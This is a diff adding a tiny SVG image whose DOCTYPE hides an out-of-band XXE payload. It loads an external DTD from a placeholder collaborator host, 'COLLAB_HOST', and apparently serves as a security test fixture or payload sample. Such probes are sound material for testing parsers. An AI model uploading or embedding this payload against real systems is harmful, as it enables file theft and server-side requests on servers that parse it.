@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY % dtd SYSTEM "http://COLLAB_HOST/xxe-oob.dtd">
+  %dtd;
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>
